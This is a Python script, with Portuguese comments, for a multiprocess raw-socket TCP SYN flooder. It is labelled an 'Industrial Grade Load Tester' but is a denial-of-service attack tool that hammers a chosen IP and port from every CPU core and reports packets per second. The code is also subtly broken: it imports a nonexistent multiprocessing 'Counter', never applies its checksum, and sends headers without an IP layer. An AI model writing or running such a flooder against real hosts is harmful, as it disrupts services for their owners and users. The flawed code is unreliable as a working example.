import argparse
import os
import random
import socket
import struct
import signal
import logging
from multiprocessing import Process, Event, Counter

logging.basicConfig(level=logging.INFO, format='%(asctime)s [PID %(process)d] %(levelname)s: %(message)s')
logger = logging.getLogger(__name__)

class RawSYNFlooder:
    """Implementação de alta performance usando Raw Sockets e Multiprocessing."""
    
    def __init__(self, target_ip, target_port):
        self.target_ip = socket.gethostbyname(target_ip)
        self.target_port = target_port
        self.stop_event = Event()

    def _checksum(self, msg):
        """Calcula o checksum do cabeçalho TCP/IP."""
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i+1])
            s = s + w
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s

    def _create_raw_packet(self):
        sport = random.randint(1024, 65535)
        seq = random.randint(0, 4294967295)
        
        # TCP Header: Source Port, Dest Port, Seq, Ack, Offset, Flags, Window, Checksum, Urgent
        tcp_header = struct.pack('!HHLLBBH H H', 
            sport, self.target_port, # Ports
            seq, 0,                 # Seq, Ack
            (5 << 4), 2,            # Offset, Flags (SYN=2)
            socket.htons(5840),     # Window
            0, 0                    # Checksum (init), Urgent
        )
        return tcp_header

    def worker(self, counter):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            logger.error("Permissão negada! Execute como ROOT/SUDO.")
            return

        while not self.stop_event.is_set():
            try:
                packet = self._create_raw_packet()
                s.sendto(packet, (self.target_ip, 0))
                counter.value += 1 
            except Exception:
                continue

    def run(self, process_count):
        logger.info(f"Iniciando carga massiva em {self.target_ip}:{self.target_port}")
        logger.info(f"Escalando para {process_count} núcleos de CPU...")
        
        shared_counter = Counter(0)
        processes = []

        for _ in range(process_count):
            p = Process(target=self.worker, args=(shared_counter,))
            p.daemon = True
            p.start()
            processes.append(p)

        return processes, shared_counter

def main():
    parser = argparse.ArgumentParser(description="Industrial Grade Load Tester")
    parser.add_argument("target", help="IP Alvo")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--cores", type=int, default=os.cpu_count())
    args = parser.parse_args()

    flooder = RawSYNFlooder(args.target, args.port)
    
    def shutdown_handler(sig, frame):
        flooder.stop_event.set()
        logger.info("\nEncerrando teste...")
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown_handler)

    processes, counter = flooder.run(args.cores)
    try:
        while True:
            import time
            before = counter.value
            time.sleep(1)
            pps = counter.value - before
            print(f"\r[STATUS] Pacotes Enviados: {counter.value} | Velocidade: {pps} p/s", end="")
    except KeyboardInterrupt:
        shutdown_handler(None, None)

if __name__ == "__main__":
    import sys
    main()